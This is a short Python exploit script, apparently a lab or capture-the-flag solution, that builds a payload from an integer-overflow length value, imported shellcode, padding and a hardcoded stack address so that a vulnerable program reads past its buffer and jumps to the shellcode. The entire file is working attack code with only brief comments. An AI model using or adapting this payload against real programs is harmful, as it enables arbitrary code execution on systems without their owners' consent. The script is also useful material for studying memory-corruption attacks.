#!/usr/bin/env python3

import sys

from shellcode import shellcode

#use int overflow to get a big value. Func will read and continue reading if 64 * 4 (size of u_int)
overflow_val = 0x8fffffffffffffff.to_bytes(8, 'little')
#after val, put shellcode into registers in memory - locate these after using shellcode memory location
pad = b'A'*18
#shellcode location:
shellcode_loc = 0x7ffffff68f90.to_bytes(8, 'little')

sys.stdout.buffer.write(overflow_val + shellcode + pad + shellcode_loc)